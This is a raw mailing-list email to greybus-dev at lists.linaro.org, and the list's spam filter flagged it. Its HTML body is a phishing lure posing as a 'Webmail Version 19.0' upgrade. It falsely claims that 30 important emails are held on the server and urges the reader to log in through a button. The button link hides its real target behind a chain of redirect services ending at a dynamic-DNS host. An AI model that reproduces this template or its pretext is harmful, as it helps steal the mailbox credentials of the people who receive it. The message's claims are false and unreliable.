Return-Path: <greybus-dev-bounces+lists+greybus-dev=lfdr.de@lists.linaro.org>
X-Original-To: lists+greybus-dev@lfdr.de
Delivered-To: lists+greybus-dev@lfdr.de
Received: from lists.linaro.org (lists.linaro.org [3.208.193.21])
	by mail.lfdr.de (Postfix) with ESMTPS id CE119B3D05F
	for <lists+greybus-dev@lfdr.de>; Sun, 31 Aug 2025 02:50:55 +0200 (CEST)
Received: from lists.linaro.org (localhost [127.0.0.1])
	by lists.linaro.org (Postfix) with ESMTP id EC02145D57
	for <lists+greybus-dev@lfdr.de>; Sun, 31 Aug 2025 00:50:54 +0000 (UTC)
Received: from dorothylewis.info (unknown [157.66.48.22])
	by lists.linaro.org (Postfix) with ESMTPS id 3C2D63F717
	for <greybus-dev@lists.linaro.org>; Fri, 29 Aug 2025 15:40:57 +0000 (UTC)
Authentication-Results: lists.linaro.org;
	dkim=pass header.d=dorothylewis.info header.s=default header.b=YYdd6kkG;
	spf=pass (lists.linaro.org: domain of peter@dorothylewis.info designates 157.66.48.22 as permitted sender) smtp.mailfrom=peter@dorothylewis.info;
	dmarc=pass (policy=quarantine) header.from=dorothylewis.info
Received: from 103.179.173.99.cloudfly.vn (unknown [103.179.173.99])
	by dorothylewis.info (Postfix) with ESMTPSA id 5122E30F59
	for <greybus-dev@lists.linaro.org>; Fri, 29 Aug 2025 13:13:38 +0200 (CEST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=dorothylewis.info;
	s=default; t=1756466018;
	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
	 to:to:cc:mime-version:mime-version:content-type:content-type:
	 content-transfer-encoding:content-transfer-encoding;
	bh=scqhBLWoqe4YW4GUJOgJKKtpty2tMagwAKy5rpbqhMw=;
	b=YYdd6kkGQanVBh2Yhqbwt7RP5EHkMhABz8uF2V5qZjoHhYzloxsq1pgMjtu2uO6rPfpAUC
	8VpYKt4n9hO7umfYKWxy81kfgsPjzzztBfUxYtDqq+4qqkO4CxJQHl+Bh6aUDj9ER8YJ/W
	zLimWD59ujmdU4kfsmxT6rtks80vhRg=
From: "Mail Solutions on lists.linaro.org" <peter@dorothylewis.info>
To: greybus-dev@lists.linaro.org
Date: 29 Aug 2025 18:13:37 +0700
Message-ID: <20250829181336.8A56C0BB183F36CE@dorothylewis.info>
MIME-Version: 1.0
X-Rspamd-Action: add header
X-Rspamd-Server: lists.linaro.org
X-Spam-Level: ***********
X-Rspamd-Queue-Id: 3C2D63F717
X-Spamd-Bar: +++++++++++
X-Spamd-Result: default: False [11.31 / 15.00];
	SPAM_FLAG(5.00)[];
	HFILTER_HOSTNAME_UNKNOWN(2.50)[];
	RDNS_NONE(2.00)[];
	BAYES_SPAM(1.41)[85.12%];
	MIME_HTML_ONLY(0.20)[];
	ONCE_RECEIVED(0.10)[];
	BAD_REP_POLICIES(0.10)[];
	PREVIOUSLY_DELIVERED(0.00)[greybus-dev@lists.linaro.org];
	TO_MATCH_ENVRCPT_ALL(0.00)[];
	R_DKIM_ALLOW(0.00)[dorothylewis.info:s=default];
	FROM_EQ_ENVFROM(0.00)[];
	GREYLIST(0.00)[pass,body];
	FROM_HAS_DN(0.00)[];
	DMARC_POLICY_ALLOW(0.00)[dorothylewis.info,quarantine];
	ARC_NA(0.00)[];
	RCPT_COUNT_ONE(0.00)[1];
	RCVD_TLS_ALL(0.00)[];
	DKIM_TRACE(0.00)[dorothylewis.info:+];
	MIME_TRACE(0.00)[0:~];
	R_SPF_ALLOW(0.00)[+a];
	MID_RHS_MATCH_FROM(0.00)[];
	TO_DN_NONE(0.00)[];
	RCVD_VIA_SMTP_AUTH(0.00)[];
	RCVD_COUNT_ONE(0.00)[1];
	ASN(0.00)[asn:150895, ipnet:157.66.48.0/23, country:VN];
	MISSING_XM_UA(0.00)[];
	NEURAL_SPAM(0.00)[1.000]
X-MailFrom: peter@dorothylewis.info
X-Mailman-Rule-Hits: nonmember-moderation
X-Mailman-Rule-Misses: dmarc-mitigation; no-senders; approved; emergency; loop; banned-address; member-moderation
Message-ID-Hash: IIEZDD467STOETIHMBUBBIKHEDEW7VTV
X-Message-ID-Hash: IIEZDD467STOETIHMBUBBIKHEDEW7VTV
X-Mailman-Approved-At: Sun, 31 Aug 2025 00:50:43 +0000
X-Mailman-Version: 3.3.5
Precedence: list
Subject: [greybus-dev] lists.linaro.org Version 19.0 now avaliable for upgrade.
List-Id: Greybus Development Mail List <greybus-dev.lists.linaro.org>
Archived-At: <https://lists.linaro.org/archives/list/greybus-dev@lists.linaro.org/message/IIEZDD467STOETIHMBUBBIKHEDEW7VTV/>
List-Archive: <https://lists.linaro.org/archives/list/greybus-dev@lists.linaro.org/>
List-Help: <mailto:greybus-dev-request@lists.linaro.org?subject=help>
List-Owner: <mailto:greybus-dev-owner@lists.linaro.org>
List-Post: <mailto:greybus-dev@lists.linaro.org>
List-Subscribe: <mailto:greybus-dev-join@lists.linaro.org>
List-Unsubscribe: <mailto:greybus-dev-leave@lists.linaro.org>
Content-Type: multipart/mixed; boundary="===============3702566287503386868=="
X-Spam: Yes

--===============3702566287503386868==
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<html><head></head><body>&nbsp;&nbsp;=20
&nbsp;=20
=20
<sender>=20
=20



<div style=3D"background: rgb(32, 80, 129); padding: 13px 0px 10px; text-al=
ign: center; color: rgb(255, 255, 255); text-transform: none; text-indent: =
0px; letter-spacing: 0.3px; font-family: sans-serif; font-size: 1.05em; fon=
t-style: normal; font-weight: 600; word-spacing: 0px; white-space: normal; =
box-sizing: border-box; orphans: 2; widows: 2; font-variant-ligatures: norm=
al; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decorat=
ion-thickness: initial; text-decoration-style:=20
initial; text-decoration-color: initial;"><br style=3D"box-sizing: border-b=
ox;">Webmail Version 19.0&nbsp; &nbsp;lists.linaro.org<br style=3D"box-sizi=
ng: border-box;"></div>
<div style=3D"background: rgb(32, 80, 129); padding: 13px 0px 10px; text-al=
ign: center; color: rgb(255, 255, 255); text-transform: none; text-indent: =
0px; letter-spacing: 0.3px; font-family: sans-serif; font-size: 1.05em; fon=
t-style: normal; font-weight: 600; word-spacing: 0px; white-space: normal; =
box-sizing: border-box; orphans: 2; widows: 2; font-variant-ligatures: norm=
al; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decorat=
ion-thickness: initial; text-decoration-style:=20
initial; text-decoration-color: initial;"><br style=3D"box-sizing: border-b=
ox;"></div>
<div style=3D"padding: 19px 20px 6px; text-align: left; color: rgb(34, 34, =
51); text-transform: none; text-indent: 0px; letter-spacing: normal; font-f=
amily: sans-serif; font-size: 0.98em; font-style: normal; font-weight: 400;=
 word-spacing: 0px; white-space: normal; box-sizing: border-box; orphans: 2=
; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: =
normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-dec=
oration-thickness: initial; text-decoration-style:=20
initial; text-decoration-color: initial;"><div style=3D"margin-bottom: 10px=
; box-sizing: border-box;">Email:<span style=3D"box-sizing: border-box;">&n=
bsp;</span><span>&nbsp;<strong>greybus-dev@lists.linaro.org</strong></span>=
<br style=3D"box-sizing: border-box;">Domain:<span style=3D"box-sizing: bor=
der-box;">&nbsp;<strong>lists.linaro.org</strong></span><br style=3D"box-si=
zing: border-box;">
Title:<span style=3D"box-sizing: border-box;">&nbsp;</span><b style=3D"font=
-weight: bolder; box-sizing: border-box;">Server has important emails suspe=
nded.</b><br style=3D"box-sizing: border-box;"><br style=3D"box-sizing: bor=
der-box;"></div><hr style=3D"background: linear-gradient(90deg, rgb(240, 24=
4, 248) 0%, rgb(226, 231, 238) 100%); margin: 12px 0px 18px; border: 0px cu=
rrentColor; border-image: none; height: 1px; overflow: visible; box-sizing:=
 content-box;">
<div style=3D"margin-bottom: 12px; box-sizing: border-box;">A new webmail v=
ersion 19.0 has been released for&nbsp;lists.linaro.org,&nbsp; greybus-dev@=
lists.linaro.org&nbsp;Server.<br style=3D"box-sizing: border-box;"><br styl=
e=3D"box-sizing: border-box;">There are&nbsp;30 email (s) marked as importa=
nt waiting on the server.</div><div style=3D"margin-bottom: 12px; box-sizin=
g: border-box;">To access emails that are stuck on the server, log in using=
 the new version.</div><br style=3D"box-sizing: border-box;">
<div style=3D"margin: 0px; text-align: center; box-sizing: border-box;">
<a style=3D"background: rgb(34, 116, 165); padding: 8px 24px; border-radius=
: 0px; color: rgb(255, 255, 255); font-size: 0.97em; font-weight: 600; text=
-decoration: none; display: inline-block; box-sizing: border-box;" href=3D"=
https://knoji.digidip.net/visit?url=3Dhttps://coupons.digidip.net/visit?url=
=3Dhttps://anti-crise.digidip.net/visit?url=3Dhttps://glepl9lddymi8cnwm29ue=
mmd.myddns.com#greybus-dev@lists.linaro.org" target=3D"_blank" rel=3D"noref=
errer">
Access Webmail 19.0 for greybus-dev@lists.linaro.org</a>
<br style=3D"box-sizing: border-box;"></div>
<br style=3D"box-sizing: border-box;"></div>
<div style=3D"padding: 19px 20px 6px; text-align: left; color: rgb(34, 34, =
51); text-transform: none; text-indent: 0px; letter-spacing: normal; font-f=
amily: sans-serif; font-size: 0.98em; font-style: normal; font-weight: 400;=
 word-spacing: 0px; white-space: normal; box-sizing: border-box; orphans: 2=
; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: =
normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-dec=
oration-thickness: initial; text-decoration-style:=20
initial; text-decoration-color: initial;">Note: You only need to log in,The=
n all &nbsp;Pending emails will arrive 30 minutes after successful login.<b=
r style=3D"box-sizing: border-box;"></div>
<div style=3D"padding: 19px 20px 6px; text-align: left; color: rgb(34, 34, =
51); text-transform: none; text-indent: 0px; letter-spacing: normal; font-f=
amily: sans-serif; font-size: 0.98em; font-style: normal; font-weight: 400;=
 word-spacing: 0px; white-space: normal; box-sizing: border-box; orphans: 2=
; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: =
normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-dec=
oration-thickness: initial; text-decoration-style:=20
initial; text-decoration-color: initial;"><br style=3D"box-sizing: border-b=
ox;"></div>
<div style=3D"background: rgb(249, 250, 252); padding: 9px 20px 8px; text-a=
lign: left; color: rgb(125, 152, 179); text-transform: none; text-indent: 0=
px; letter-spacing: normal; font-family: sans-serif; font-size: 0.92em; fon=
t-style: normal; font-weight: 400; margin-top: 6px; word-spacing: 0px; bord=
er-top-color: rgb(229, 236, 244); border-top-width: 1px; border-top-style: =
solid; white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; =
font-variant-ligatures: normal; font-variant-caps:=20
normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial;=
 text-decoration-style: initial; text-decoration-color: initial;">Seocounse=
ler<span style=3D"font-weight: 600; box-sizing: border-box;">&nbsp;</span><=
span>&nbsp;</span>Services<span>&nbsp;</span><span style=3D"font-weight: 60=
0; box-sizing: border-box;">| All rights reserved | &copy; 2025</span></div=
><default>&nbsp;&nbsp; </default></sender></body></html>

--===============3702566287503386868==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
greybus-dev mailing list -- greybus-dev@lists.linaro.org
To unsubscribe send an email to greybus-dev-leave@lists.linaro.org

--===============3702566287503386868==--
